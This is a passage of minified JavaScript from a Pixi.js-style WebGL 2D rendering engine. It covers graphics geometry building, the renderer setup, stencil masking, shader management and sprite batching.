        return t.data.length && (n = t.data[t.data.length - 1]).mode === i && 1 !== i || ((n = e.WebGLGraphics.graphicsDataPool.pop() || new e.WebGLGraphicsData(t.gl)).mode = i, t.data.push(n)), n.dirty = !0, n
    }, e.WebGLGraphics.buildRectangle = function(t, i) {
        var n = t.shape,
            r = n.x,
            o = n.y,
            a = n.width,
            s = n.height;
        if (t.fill) {
            var l = e.hex2rgb(t.fillColor),
                h = t.fillAlpha,
                d = l[0] * h,
                c = l[1] * h,
                u = l[2] * h,
                f = i.points,
                p = i.indices,
                g = f.length / 6;
            f.push(r, o), f.push(d, c, u, h), f.push(r + a, o), f.push(d, c, u, h), f.push(r, o + s), f.push(d, c, u, h), f.push(r + a, o + s), f.push(d, c, u, h), p.push(g, g, g + 1, g + 2, g + 3, g + 3)
        }
        if (t.lineWidth) {
            var v = t.points;
            t.points = [r, o, r + a, o, r + a, o + s, r, o + s, r, o], e.WebGLGraphics.buildLine(t, i), t.points = v
        }
    }, e.WebGLGraphics.buildRoundedRectangle = function(t, i) {
        var n = t.shape,
            r = n.x,
            o = n.y,
            a = n.width,
            s = n.height,
            l = n.radius,
            h = [];
        if (h.push(r, o + l), h = (h = (h = (h = h.concat(e.WebGLGraphics.quadraticBezierCurve(r, o + s - l, r, o + s, r + l, o + s))).concat(e.WebGLGraphics.quadraticBezierCurve(r + a - l, o + s, r + a, o + s, r + a, o + s - l))).concat(e.WebGLGraphics.quadraticBezierCurve(r + a, o + l, r + a, o, r + a - l, o))).concat(e.WebGLGraphics.quadraticBezierCurve(r + l, o, r, o, r, o + l)), t.fill) {
            var d = e.hex2rgb(t.fillColor),
                c = t.fillAlpha,
                u = d[0] * c,
                f = d[1] * c,
                p = d[2] * c,
                g = i.points,
                v = i.indices,
                m = g.length / 6,
                y = e.PolyK.Triangulate(h);
            if (!y) return t.shape.height++, void e.WebGLGraphics.buildRoundedRectangle(t, i);
            var w = 0;
            for (w = 0; w < y.length; w += 3) v.push(y[w] + m), v.push(y[w] + m), v.push(y[w + 1] + m), v.push(y[w + 2] + m), v.push(y[w + 2] + m);
            for (w = 0; w < h.length; w++) g.push(h[w], h[++w], u, f, p, c)
        }
        if (t.lineWidth) {
            var S = t.points;
            t.points = h, e.WebGLGraphics.buildLine(t, i), t.points = S
        }
    }, e.WebGLGraphics.quadraticBezierCurve = function(e, t, i, n, r, o) {
        var a, s, l, h, d, c, u = [];

        function f(e, t, i) {
            return e + (t - e) * i
        }
        for (var p = 0, g = 0; g <= 20; g++) a = f(e, i, p = g / 20), s = f(t, n, p), l = f(i, r, p), h = f(n, o, p), d = f(a, l, p), c = f(s, h, p), u.push(d, c);
        return u
    }, e.WebGLGraphics.buildCircle = function(t, i) {
        var n, r, o = t.shape,
            a = o.x,
            s = o.y;
        t.type === e.Graphics.CIRC ? (n = o.radius, r = o.radius) : (n = o.width, r = o.height);
        var l = 2 * Math.PI / 40,
            h = 0;
        if (t.fill) {
            var d = e.hex2rgb(t.fillColor),
                c = t.fillAlpha,
                u = d[0] * c,
                f = d[1] * c,
                p = d[2] * c,
                g = i.points,
                v = i.indices,
                m = g.length / 6;
            for (v.push(m), h = 0; h < 41; h++) g.push(a, s, u, f, p, c), g.push(a + Math.sin(l * h) * n, s + Math.cos(l * h) * r, u, f, p, c), v.push(m++, m++);
            v.push(m - 1)
        }
        if (t.lineWidth) {
            var y = t.points;
            for (t.points = [], h = 0; h < 41; h++) t.points.push(a + Math.sin(l * h) * n, s + Math.cos(l * h) * r);
            e.WebGLGraphics.buildLine(t, i), t.points = y
        }
    }, e.WebGLGraphics.buildLine = function(t, i) {
        var n = 0,
            r = t.points;
        if (0 !== r.length) {
            if (t.lineWidth % 2)
                for (n = 0; n < r.length; n++) r[n] += .5;
            var o = new e.Point(r[0], r[1]),
                a = new e.Point(r[r.length - 2], r[r.length - 1]);
            if (o.x === a.x && o.y === a.y) {
                (r = r.slice()).pop(), r.pop();
                var s = (a = new e.Point(r[r.length - 2], r[r.length - 1])).x + .5 * (o.x - a.x),
                    l = a.y + .5 * (o.y - a.y);
                r.unshift(s, l), r.push(s, l)
            }
            var h, d, c, u, f, p, g, v, m, y, w, S, x, b, _, T, C, R, M, E, A, P, L = i.points,
                G = i.indices,
                k = r.length / 2,
                I = r.length,
                O = L.length / 6,
                F = t.lineWidth / 2,
                X = e.hex2rgb(t.lineColor),
                D = t.lineAlpha,
                B = X[0] * D,
                z = X[1] * D,
                H = X[2] * D;
            for (c = r[0], u = r[1], f = r[2], m = -(u - (p = r[3])), y = c - f, m /= P = Math.sqrt(m * m + y * y), y /= P, m *= F, y *= F, L.push(c - m, u - y, B, z, H, D), L.push(c + m, u + y, B, z, H, D), n = 1; n < k - 1; n++) c = r[2 * (n - 1)], u = r[2 * (n - 1) + 1], f = r[2 * n], p = r[2 * n + 1], g = r[2 * (n + 1)], v = r[2 * (n + 1) + 1], m = -(u - p), y = c - f, m /= P = Math.sqrt(m * m + y * y), y /= P, m *= F, y *= F, w = -(p - v), S = f - g, w /= P = Math.sqrt(w * w + S * S), S /= P, C = (-m + c) * (-y + p) - (-m + f) * (-y + u), E = (-(w *= F) + g) * (-(S *= F) + p) - (-w + f) * (-S + v), A = (_ = -y + u - (-y + p)) * (M = -w + f - (-w + g)) - (R = -S + v - (-S + p)) * (T = -m + f - (-m + c)), Math.abs(A) < .1 ? (A += 10.1, L.push(f - m, p - y, B, z, H, D), L.push(f + m, p + y, B, z, H, D)) : ((h = (T * E - M * C) / A) - f) * (h - f) + ((d = (R * C - _ * E) / A) - p) + (d - p) > 19600 ? (x = m - w, b = y - S, x /= P = Math.sqrt(x * x + b * b), b /= P, x *= F, b *= F, L.push(f - x, p - b), L.push(B, z, H, D), L.push(f + x, p + b), L.push(B, z, H, D), L.push(f - x, p - b), L.push(B, z, H, D), I++) : (L.push(h, d), L.push(B, z, H, D), L.push(f - (h - f), p - (d - p)), L.push(B, z, H, D));
            for (c = r[2 * (k - 2)], u = r[2 * (k - 2) + 1], f = r[2 * (k - 1)], m = -(u - (p = r[2 * (k - 1) + 1])), y = c - f, m /= P = Math.sqrt(m * m + y * y), y /= P, m *= F, y *= F, L.push(f - m, p - y), L.push(B, z, H, D), L.push(f + m, p + y), L.push(B, z, H, D), G.push(O), n = 0; n < I; n++) G.push(O++);
            G.push(O - 1)
        }
    }, e.WebGLGraphics.buildComplexPoly = function(t, i) {
        var n = t.points.slice();
        if (!(n.length < 6)) {
            var r = i.indices;
            i.points = n, i.alpha = t.fillAlpha, i.color = e.hex2rgb(t.fillColor);
            for (var o, a, s = 1 / 0, l = -1 / 0, h = 1 / 0, d = -1 / 0, c = 0; c < n.length; c += 2) s = (o = n[c]) < s ? o : s, l = o > l ? o : l, h = (a = n[c + 1]) < h ? a : h, d = a > d ? a : d;
            n.push(s, h, l, h, l, d, s, d);
            var u = n.length / 2;
            for (c = 0; c < u; c++) r.push(c)
        }
    }, e.WebGLGraphics.buildPoly = function(t, i) {
        var n = t.points;
        if (!(n.length < 6)) {
            var r = i.points,
                o = i.indices,
                a = n.length / 2,
                s = e.hex2rgb(t.fillColor),
                l = t.fillAlpha,
                h = s[0] * l,
                d = s[1] * l,
                c = s[2] * l,
                u = e.PolyK.Triangulate(n);
            if (!u) return !1;
            var f = r.length / 6,
                p = 0;
            for (p = 0; p < u.length; p += 3) o.push(u[p] + f), o.push(u[p] + f), o.push(u[p + 1] + f), o.push(u[p + 2] + f), o.push(u[p + 2] + f);
            for (p = 0; p < a; p++) r.push(n[2 * p], n[2 * p + 1], h, d, c, l);
            return !0
        }
    }, e.WebGLGraphics.graphicsDataPool = [], e.WebGLGraphicsData = function(e) {
        this.gl = e, this.color = [0, 0, 0], this.points = [], this.indices = [], this.buffer = e.createBuffer(), this.indexBuffer = e.createBuffer(), this.mode = 1, this.alpha = 1, this.dirty = !0
    }, e.WebGLGraphicsData.prototype.reset = function() {
        this.points = [], this.indices = []
    }, e.WebGLGraphicsData.prototype.upload = function() {
        var t = this.gl;
        this.glPoints = new e.Float32Array(this.points), t.bindBuffer(t.ARRAY_BUFFER, this.buffer), t.bufferData(t.ARRAY_BUFFER, this.glPoints, t.STATIC_DRAW), this.glIndicies = new e.Uint16Array(this.indices), t.bindBuffer(t.ELEMENT_ARRAY_BUFFER, this.indexBuffer), t.bufferData(t.ELEMENT_ARRAY_BUFFER, this.glIndicies, t.STATIC_DRAW), this.dirty = !1
    }, e.glContexts = [], e.instances = [], e.WebGLRenderer = function(t, i, n) {
        if (n)
            for (var r in e.defaultRenderOptions) void 0 === n[r] && (n[r] = e.defaultRenderOptions[r]);
        else n = e.defaultRenderOptions;
        e.defaultRenderer || (e.defaultRenderer = this), this.type = e.WEBGL_RENDERER, this.transparent = n.transparent, this.autoResize = n.autoResize || !1, this.preserveDrawingBuffer = n.preserveDrawingBuffer, this.clearBeforeRender = n.clearBeforeRender, this.width = t || 800, this.height = i || 600, this.view = n.view || document.createElement("canvas"), this.contextLostBound = this.handleContextLost.bind(this), this.contextRestoredBound = this.handleContextRestored.bind(this), this.view.addEventListener("webglcontextlost", this.contextLostBound, !1), this.view.addEventListener("webglcontextrestored", this.contextRestoredBound, !1), this._contextOptions = {
            alpha: this.transparent,
            antialias: n.antialias,
            premultipliedAlpha: this.transparent && "notMultiplied" !== this.transparent,
            stencil: !0,
            preserveDrawingBuffer: n.preserveDrawingBuffer
        }, this.projection = new e.Point, this.offset = new e.Point(0, 0), this.shaderManager = new e.WebGLShaderManager, this.spriteBatch = new e.WebGLSpriteBatch, this.maskManager = new e.WebGLMaskManager, this.filterManager = new e.WebGLFilterManager, this.stencilManager = new e.WebGLStencilManager, this.blendModeManager = new e.WebGLBlendModeManager, this.renderSession = {}, this.renderSession.gl = this.gl, this.renderSession.drawCount = 0, this.renderSession.shaderManager = this.shaderManager, this.renderSession.maskManager = this.maskManager, this.renderSession.filterManager = this.filterManager, this.renderSession.blendModeManager = this.blendModeManager, this.renderSession.spriteBatch = this.spriteBatch, this.renderSession.stencilManager = this.stencilManager, this.renderSession.renderer = this, this.initContext(), this.mapBlendModes()
    }, e.WebGLRenderer.prototype.constructor = e.WebGLRenderer, e.WebGLRenderer.prototype.initContext = function() {
        var t = this.view.getContext("webgl", this._contextOptions);
        if (this.gl = t, !t) throw new Error("This browser does not support webGL. Try using the canvas renderer");
        this.glContextId = t.id = e.WebGLRenderer.glContextId++, e.glContexts[this.glContextId] = t, e.instances[this.glContextId] = this, t.disable(t.DEPTH_TEST), t.disable(t.CULL_FACE), t.enable(t.BLEND), this.shaderManager.setContext(t), this.spriteBatch.setContext(t), this.maskManager.setContext(t), this.filterManager.setContext(t), this.blendModeManager.setContext(t), this.stencilManager.setContext(t), this.renderSession.gl = this.gl, this.resize(this.width, this.height)
    }, e.WebGLRenderer.prototype.render = function(e) {
        if (!this.contextLost) {
            this.__stage !== e && (e.interactive && e.interactionManager.removeEvents(), this.__stage = e), e.updateTransform();
            var t = this.gl;
            e._interactiveEventsAdded || (e._interactiveEventsAdded = !0, e.interactionManager.setTarget(this)), t.viewport(0, 0, this.width, this.height), t.bindFramebuffer(t.FRAMEBUFFER, null), t.clearColor(e.backgroundColorSplit[0], e.backgroundColorSplit[1], e.backgroundColorSplit[2], 1), t.clear(t.COLOR_BUFFER_BIT), this.renderDisplayObject(e, this.projection)
        }
    }, e.WebGLRenderer.prototype.renderDisplayObject = function(t, i, n) {
        this.renderSession.blendModeManager.setBlendMode(e.blendModes.NORMAL), this.renderSession.drawCount = 0, this.renderSession.flipY = n ? -1 : 1, this.renderSession.projection = i, this.renderSession.offset = this.offset, this.spriteBatch.begin(this.renderSession), this.filterManager.begin(this.renderSession, n), t._renderWebGL(this.renderSession), this.spriteBatch.end()
    }, e.WebGLRenderer.prototype.resize = function(e, t) {
        this.width = e, this.height = t, this.view.width = this.width, this.view.height = this.height, this.gl.viewport(0, 0, this.width, this.height), this.projection.x = this.width / 2, this.projection.y = -this.height / 2
    }, e.WebGLRenderer.prototype.updateTexture = function(t) {
        if (t.hasLoaded && t.source && t.source.width && t.source.height) {
            var i = this.gl;
            try {
                void 0 !== this._lastSize && (e.frvrTextureMemoryUsage -= 4 * t._lastSize.w * t._lastSize.h)
            } catch (e) {}
            t._glTextures[i.id] || (t._glTextures[i.id] = i.createTexture()), i.bindTexture(i.TEXTURE_2D, t._glTextures[i.id]), i.pixelStorei(i.UNPACK_PREMULTIPLY_ALPHA_WEBGL, t.premultipliedAlpha), i.texImage2D(i.TEXTURE_2D, 0, i.RGBA, i.RGBA, i.UNSIGNED_BYTE, t.source);
            try {
                e.frvrTextureMemoryUsage += 4 * t.source.width * t.source.height, t._lastSize = {
                    w: t.source.width,
                    h: t.source.height
                }
            } catch (e) {}
            return i.texParameteri(i.TEXTURE_2D, i.TEXTURE_MAG_FILTER, t.scaleMode === e.scaleModes.LINEAR ? i.LINEAR : i.NEAREST), i.texParameteri(i.TEXTURE_2D, i.TEXTURE_MIN_FILTER, t.scaleMode === e.scaleModes.LINEAR ? i.LINEAR : i.NEAREST), i.texParameteri(i.TEXTURE_2D, i.TEXTURE_WRAP_S, i.CLAMP_TO_EDGE), i.texParameteri(i.TEXTURE_2D, i.TEXTURE_WRAP_T, i.CLAMP_TO_EDGE), t._dirty[i.id] = !1, t._glTextures[i.id]
        }
    }, e.WebGLRenderer.prototype.handleContextLost = function(e) {
        e.preventDefault(), this.contextLost = !0
    }, e.WebGLRenderer.prototype.handleContextRestored = function() {
        for (var t in this.initContext(), e.TextureCache) {
            e.TextureCache[t].baseTexture._glTextures = []
        }
        this.contextLost = !1
    }, e.WebGLRenderer.prototype.destroy = function() {
        this.view.removeEventListener("webglcontextlost", this.contextLostBound), this.view.removeEventListener("webglcontextrestored", this.contextRestoredBound), e.glContexts[this.glContextId] = null, this.projection = null, this.offset = null, this.shaderManager.destroy(), this.spriteBatch.destroy(), this.maskManager.destroy(), this.filterManager.destroy(), this.shaderManager = null, this.spriteBatch = null, this.maskManager = null, this.filterManager = null, this.gl = null, this.renderSession = null
    }, e.WebGLRenderer.prototype.mapBlendModes = function() {
        var t = this.gl;
        e.blendModesWebGL || (e.blendModesWebGL = [], e.blendModesWebGL[e.blendModes.NORMAL] = [t.ONE, t.ONE_MINUS_SRC_ALPHA], e.blendModesWebGL[e.blendModes.ADD] = [t.SRC_ALPHA, t.DST_ALPHA], e.blendModesWebGL[e.blendModes.MULTIPLY] = [t.DST_COLOR, t.ONE_MINUS_SRC_ALPHA], e.blendModesWebGL[e.blendModes.SCREEN] = [t.SRC_ALPHA, t.ONE])
    }, e.WebGLRenderer.glContextId = 0, e.WebGLBlendModeManager = function() {
        this.currentBlendMode = 99999
    }, e.WebGLBlendModeManager.prototype.constructor = e.WebGLBlendModeManager, e.WebGLBlendModeManager.prototype.setContext = function(e) {
        this.gl = e
    }, e.WebGLBlendModeManager.prototype.setBlendMode = function(t) {
        if (this.currentBlendMode === t) return !1;
        this.currentBlendMode = t;
        var i = e.blendModesWebGL[this.currentBlendMode];
        return this.gl.blendFunc(i[0], i[1]), !0
    }, e.WebGLBlendModeManager.prototype.destroy = function() {
        this.gl = null
    }, e.WebGLMaskManager = function() {}, e.WebGLMaskManager.prototype.constructor = e.WebGLMaskManager, e.WebGLMaskManager.prototype.setContext = function(e) {
        this.gl = e
    }, e.WebGLMaskManager.prototype.pushMask = function(t, i) {
        var n = i.gl;
        t.dirty && e.WebGLGraphics.updateGraphics(t, n), t._webGL[n.id].data.length && i.stencilManager.pushStencil(t, t._webGL[n.id].data[0], i)
    }, e.WebGLMaskManager.prototype.popMask = function(e, t) {
        var i = this.gl;
        t.stencilManager.popStencil(e, e._webGL[i.id].data[0], t)
    }, e.WebGLMaskManager.prototype.destroy = function() {
        this.gl = null
    }, e.WebGLStencilManager = function() {
        this.stencilStack = [], this.reverse = !0, this.count = 0
    }, e.WebGLStencilManager.prototype.setContext = function(e) {
        this.gl = e
    }, e.WebGLStencilManager.prototype.pushStencil = function(e, t, i) {
        var n = this.gl;
        this.bindGraphics(e, t, i), 0 === this.stencilStack.length && (n.enable(n.STENCIL_TEST), n.clear(n.STENCIL_BUFFER_BIT), this.reverse = !0, this.count = 0), this.stencilStack.push(t);
        var r = this.count;
        n.colorMask(!1, !1, !1, !1), n.stencilFunc(n.ALWAYS, 0, 255), n.stencilOp(n.KEEP, n.KEEP, n.INVERT), 1 === t.mode ? (n.drawElements(n.TRIANGLE_FAN, t.indices.length - 4, n.UNSIGNED_SHORT, 0), this.reverse ? (n.stencilFunc(n.EQUAL, 255 - r, 255), n.stencilOp(n.KEEP, n.KEEP, n.DECR)) : (n.stencilFunc(n.EQUAL, r, 255), n.stencilOp(n.KEEP, n.KEEP, n.INCR)), n.drawElements(n.TRIANGLE_FAN, 4, n.UNSIGNED_SHORT, 2 * (t.indices.length - 4)), this.reverse ? n.stencilFunc(n.EQUAL, 255 - (r + 1), 255) : n.stencilFunc(n.EQUAL, r + 1, 255), this.reverse = !this.reverse) : (this.reverse ? (n.stencilFunc(n.EQUAL, r, 255), n.stencilOp(n.KEEP, n.KEEP, n.INCR)) : (n.stencilFunc(n.EQUAL, 255 - r, 255), n.stencilOp(n.KEEP, n.KEEP, n.DECR)), n.drawElements(n.TRIANGLE_STRIP, t.indices.length, n.UNSIGNED_SHORT, 0), this.reverse ? n.stencilFunc(n.EQUAL, r + 1, 255) : n.stencilFunc(n.EQUAL, 255 - (r + 1), 255)), n.colorMask(!0, !0, !0, !0), n.stencilOp(n.KEEP, n.KEEP, n.KEEP), this.count++
    }, e.WebGLStencilManager.prototype.bindGraphics = function(t, i, n) {
        this._currentGraphics = t;
        var r, o = this.gl,
            a = n.projection,
            s = n.offset;
        1 === i.mode ? (r = n.shaderManager.complexPrimitiveShader, n.shaderManager.setShader(r), o.uniform1f(r.flipY, n.flipY), o.uniformMatrix3fv(r.translationMatrix, !1, t.worldTransform.toArray(!0)), o.uniform2f(r.projectionVector, a.x, -a.y), o.uniform2f(r.offsetVector, -s.x, -s.y), o.uniform3fv(r.tintColor, e.hex2rgb(t.tint)), o.uniform3fv(r.color, i.color), o.uniform1f(r.alpha, t.worldAlpha * i.alpha), o.bindBuffer(o.ARRAY_BUFFER, i.buffer), o.vertexAttribPointer(r.aVertexPosition, 2, o.FLOAT, !1, 8, 0), o.bindBuffer(o.ELEMENT_ARRAY_BUFFER, i.indexBuffer)) : (r = n.shaderManager.primitiveShader, n.shaderManager.setShader(r), o.uniformMatrix3fv(r.translationMatrix, !1, t.worldTransform.toArray(!0)), o.uniform1f(r.flipY, n.flipY), o.uniform2f(r.projectionVector, a.x, -a.y), o.uniform2f(r.offsetVector, -s.x, -s.y), o.uniform3fv(r.tintColor, e.hex2rgb(t.tint)), o.uniform1f(r.alpha, t.worldAlpha), o.bindBuffer(o.ARRAY_BUFFER, i.buffer), o.vertexAttribPointer(r.aVertexPosition, 2, o.FLOAT, !1, 24, 0), o.vertexAttribPointer(r.colorAttribute, 4, o.FLOAT, !1, 24, 8), o.bindBuffer(o.ELEMENT_ARRAY_BUFFER, i.indexBuffer))
    }, e.WebGLStencilManager.prototype.popStencil = function(e, t, i) {
        var n = this.gl;
        if (this.stencilStack.pop(), this.count--, 0 === this.stencilStack.length) n.disable(n.STENCIL_TEST);
        else {
            var r = this.count;
            this.bindGraphics(e, t, i), n.colorMask(!1, !1, !1, !1), 1 === t.mode ? (this.reverse = !this.reverse, this.reverse ? (n.stencilFunc(n.EQUAL, 255 - (r + 1), 255), n.stencilOp(n.KEEP, n.KEEP, n.INCR)) : (n.stencilFunc(n.EQUAL, r + 1, 255), n.stencilOp(n.KEEP, n.KEEP, n.DECR)), n.drawElements(n.TRIANGLE_FAN, 4, n.UNSIGNED_SHORT, 2 * (t.indices.length - 4)), n.stencilFunc(n.ALWAYS, 0, 255), n.stencilOp(n.KEEP, n.KEEP, n.INVERT), n.drawElements(n.TRIANGLE_FAN, t.indices.length - 4, n.UNSIGNED_SHORT, 0), this.reverse ? n.stencilFunc(n.EQUAL, r, 255) : n.stencilFunc(n.EQUAL, 255 - r, 255)) : (this.reverse ? (n.stencilFunc(n.EQUAL, r + 1, 255), n.stencilOp(n.KEEP, n.KEEP, n.DECR)) : (n.stencilFunc(n.EQUAL, 255 - (r + 1), 255), n.stencilOp(n.KEEP, n.KEEP, n.INCR)), n.drawElements(n.TRIANGLE_STRIP, t.indices.length, n.UNSIGNED_SHORT, 0), this.reverse ? n.stencilFunc(n.EQUAL, r, 255) : n.stencilFunc(n.EQUAL, 255 - r, 255)), n.colorMask(!0, !0, !0, !0), n.stencilOp(n.KEEP, n.KEEP, n.KEEP)
        }
    }, e.WebGLStencilManager.prototype.destroy = function() {
        this.stencilStack = null, this.gl = null
    }, e.WebGLShaderManager = function() {
        this.maxAttibs = 10, this.attribState = [], this.tempAttribState = [];
        for (var e = 0; e < this.maxAttibs; e++) this.attribState[e] = !1;
        this.stack = []
    }, e.WebGLShaderManager.prototype.constructor = e.WebGLShaderManager, e.WebGLShaderManager.prototype.setContext = function(t) {
        this.gl = t, this.primitiveShader = new e.PrimitiveShader(t), this.complexPrimitiveShader = new e.ComplexPrimitiveShader(t), this.defaultShader = new e.PixiShader(t), this.fastShader = new e.PixiFastShader(t), this.setShader(this.defaultShader)
    }, e.WebGLShaderManager.prototype.setAttribs = function(e) {
        var t;
        for (t = 0; t < this.tempAttribState.length; t++) this.tempAttribState[t] = !1;
        for (t = 0; t < e.length; t++) {
            var i = e[t];
            this.tempAttribState[i] = !0
        }
        var n = this.gl;
        for (t = 0; t < this.attribState.length; t++) this.attribState[t] !== this.tempAttribState[t] && (this.attribState[t] = this.tempAttribState[t], this.tempAttribState[t] ? n.enableVertexAttribArray(t) : n.disableVertexAttribArray(t))
    }, e.WebGLShaderManager.prototype.setShader = function(e) {
        return this._currentId !== e._UID && (this._currentId = e._UID, this.currentShader = e, this.gl.useProgram(e.program), this.setAttribs(e.attributes), !0)
    }, e.WebGLShaderManager.prototype.destroy = function() {
        this.attribState = null, this.tempAttribState = null, this.primitiveShader.destroy(), this.complexPrimitiveShader.destroy(), this.defaultShader.destroy(), this.fastShader.destroy(), this.gl = null
    }, e.WebGLSpriteBatch = function() {
        this.vertSize = 5, this.size = 2e3;
        var t = 4 * this.size * 4 * this.vertSize,
            i = 6 * this.size;
        this.vertices = new e.ArrayBuffer(t), this.positions = new e.Float32Array(this.vertices), this.colors = new e.Uint32Array(this.vertices), this.indices = new e.Uint16Array(i), this.lastIndexCount = 0;
        for (var n = 0, r = 0; n < i; n += 6, r += 4) this.indices[n + 0] = r + 0, this.indices[n + 1] = r + 1, this.indices[n + 2] = r + 2, this.indices[n + 3] = r + 0, this.indices[n + 4] = r + 2, this.indices[n + 5] = r + 3;
        this.drawing = !1, this.currentBatchSize = 0, this.currentBaseTexture = null, this.dirty = !0, this.textures = [], this.blendModes = [], this.shaders = [], this.sprites = [], this.defaultShader = new e.AbstractFilter(["precision lowp float;", "varying vec2 vTextureCoord;", "varying vec4 vColor;", "uniform sampler2D uSampler;", "void main(void) {", "   gl_FragColor = texture2D(uSampler, vTextureCoord) * vColor ;", "}"])
    }, e.WebGLSpriteBatch.prototype.setContext = function(t) {
        this.gl = t, this.vertexBuffer = t.createBuffer(), this.indexBuffer = t.createBuffer(), t.bindBuffer(t.ELEMENT_ARRAY_BUFFER, this.indexBuffer), t.bufferData(t.ELEMENT_ARRAY_BUFFER, this.indices, t.STATIC_DRAW), t.bindBuffer(t.ARRAY_BUFFER, this.vertexBuffer), t.bufferData(t.ARRAY_BUFFER, this.vertices, t.DYNAMIC_DRAW), this.currentBlendMode = 99999;
        var i = new e.PixiShader(t);
        i.fragmentSrc = this.defaultShader.fragmentSrc, i.uniforms = {}, i.init(), this.defaultShader.shaders[t.id] = i
    }, e.WebGLSpriteBatch.prototype.begin = function(e) {
        this.renderSession = e, this.shader = this.renderSession.shaderManager.defaultShader, this.start()
    }, e.WebGLSpriteBatch.prototype.end = function() {
        this.flush()
    }, e.WebGLSpriteBatch.prototype.render = function(e) {
        var t = e.texture;
        this.currentBatchSize >= this.size && (this.flush(), this.currentBaseTexture = t.baseTexture);
        t.ratio;
        var i = t._uvs;
        if (i) {
            var n, r, o, a, s = e.anchor.x,
                l = e.anchor.y;
            if (t.trim) {
                var h = t.trim;
                n = (r = h.x - s * h.width) + t.crop.width, o = (a = h.y - l * h.height) + t.crop.height
            } else n = t.frame.width * (1 - s), r = t.frame.width * -s, o = t.frame.height * (1 - l), a = t.frame.height * -l;
            var d = 4 * this.currentBatchSize * this.vertSize,
                c = e.worldTransform,
                u = c.a,
                f = c.b,
                p = c.c,
                g = c.d,
                v = c.tx,
                m = c.ty,
                y = this.colors,
                w = this.positions;
            if (e.bitmapPolygon) {
                var S = e.bitmapPolygonCords;
                w[d] = S[0] + v | 0, w[d + 1] = S[1] + m | 0, w[d + 5] = S[2] + v | 0, w[d + 6] = S[3] + m | 0, w[d + 10] = S[4] + v | 0, w[d + 11] = S[5] + m | 0, w[d + 15] = S[6] + v | 0, w[d + 16] = S[7] + m | 0
            } else t.floorCoordinates ? (w[d] = u * r + p * a + v | 0, w[d + 1] = g * a + f * r + m | 0, w[d + 5] = u * n + p * a + v | 0, w[d + 6] = g * a + f * n + m | 0, w[d + 10] = u * n + p * o + v | 0, w[d + 11] = g * o + f * n + m | 0, w[d + 15] = u * r + p * o + v | 0, w[d + 16] = g * o + f * r + m | 0) : (w[d] = u * r + p * a + v, w[d + 1] = g * a + f * r + m, w[d + 5] = u * n + p * a + v, w[d + 6] = g * a + f * n + m, w[d + 10] = u * n + p * o + v, w[d + 11] = g * o + f * n + m, w[d + 15] = u * r + p * o + v, w[d + 16] = g * o + f * r + m);
            w[d + 2] = i.x0, w[d + 3] = i.y0, w[d + 7] = i.x1, w[d + 8] = i.y1, w[d + 12] = i.x2, w[d + 13] = i.y2, w[d + 17] = i.x3, w[d + 18] = i.y3;
            var x = e.tint;
            y[d + 4] = y[d + 9] = y[d + 14] = y[d + 19] = (x >> 16) + (65280 & x) + ((255 & x) << 16) + (255 * e.worldAlpha << 24), this.sprites[this.currentBatchSize++] = e
        }
    }, e.WebGLSpriteBatch.prototype.renderTilingSprite = function(t) {
        var i = t.tilingTexture;
        this.currentBatchSize >= this.size && (this.flush(), this.currentBaseTexture = i.baseTexture), t._uvs || (t._uvs = new e.TextureUvs);
        var n = t._uvs;
        t.tilePosition.x %= i.baseTexture.width * t.tileScaleOffset.x, t.tilePosition.y %= i.baseTexture.height * t.tileScaleOffset.y;
        var r = t.tilePosition.x / (i.baseTexture.width * t.tileScaleOffset.x),
            o = t.tilePosition.y / (i.baseTexture.height * t.tileScaleOffset.y),
            a = t.width / i.baseTexture.width / (t.tileScale.x * t.tileScaleOffset.x),
            s = t.height / i.baseTexture.height / (t.tileScale.y * t.tileScaleOffset.y);
        n.x0 = 0 - r, n.y0 = 0 - o, n.x1 = 1 * a - r, n.y1 = 0 - o, n.x2 = 1 * a - r, n.y2 = 1 * s - o, n.x3 = 0 - r, n.y3 = 1 * s - o;
        var l = t.tint,
            h = (l >> 16) + (65280 & l) + ((255 & l) << 16) + (255 * t.alpha << 24),
            d = this.positions,
            c = this.colors,
            u = t.width,
            f = t.height,
            p = t.anchor.x,
            g = t.anchor.y,
            v = u * (1 - p),
            m = u * -p,
            y = f * (1 - g),
            w = f * -g,
            S = 4 * this.currentBatchSize * this.vertSize,
            x = t.worldTransform,
            b = x.a,
            _ = x.b,
            T = x.c,
            C = x.d,
            R = x.tx,
            M = x.ty;
        d[S++] = b * m + T * w + R, d[S++] = C * w + _ * m + M, d[S++] = n.x0, d[S++] = n.y0, c[S++] = h, d[S++] = b * v + T * w + R, d[S++] = C * w + _ * v + M, d[S++] = n.x1, d[S++] = n.y1, c[S++] = h, d[S++] = b * v + T * y + R, d[S++] = C * y + _ * v + M, d[S++] = n.x2, d[S++] = n.y2, c[S++] = h, d[S++] = b * m + T * y + R, d[S++] = C * y + _ * m + M, d[S++] = n.x3, d[S++] = n.y3, c[S++] = h, this.sprites[this.currentBatchSize++] = t
    }, e.WebGLSpriteBatch.prototype.flush = function() {
        if (0 !== this.currentBatchSize) {
            var t, i, n, r, o = this.gl;
            if (this.dirty) {
                this.dirty = !1, o.activeTexture(o.TEXTURE0), o.bindBuffer(o.ARRAY_BUFFER, this.vertexBuffer), o.bindBuffer(o.ELEMENT_ARRAY_BUFFER, this.indexBuffer), t = this.defaultShader.shaders[o.id];
                var a = 4 * this.vertSize;
                o.vertexAttribPointer(t.aVertexPosition, 2, o.FLOAT, !1, a, 0), o.vertexAttribPointer(t.aTextureCoord, 2, o.FLOAT, !1, a, 8), o.vertexAttribPointer(t.colorAttribute, 4, o.UNSIGNED_BYTE, !0, a, 16)
            }
            if (this.currentBatchSize > .5 * this.size) o.bufferSubData(o.ARRAY_BUFFER, 0, this.vertices);
            else {
                var s = this.positions.subarray(0, 4 * this.currentBatchSize * this.vertSize);
                o.bufferSubData(o.ARRAY_BUFFER, 0, s)
            }
            for (var l, h = 0, d = 0, c = null, u = this.renderSession.blendModeManager.currentBlendMode, f = null, p = !1, g = !1, v = 0, m = this.currentBatchSize; v < m; v++) {
                if (i = (l = this.sprites[v]).texture.baseTexture, p = u !== (n = l.blendMode), g = f !== (r = l.shader || this.defaultShader), (c !== i || p || g) && (this.renderBatch(c, h, d), d = v, h = 0, c = i, p && (u = n, this.renderSession.blendModeManager.setBlendMode(u)), g)) {
                    (t = (f = r).shaders[o.id]) || ((t = new e.PixiShader(o)).fragmentSrc = f.fragmentSrc, t.uniforms = f.uniforms, t.init(), f.shaders[o.id] = t), this.renderSession.shaderManager.setShader(t), t.dirty && t.syncUniforms();
                    var y = this.renderSession.projection;
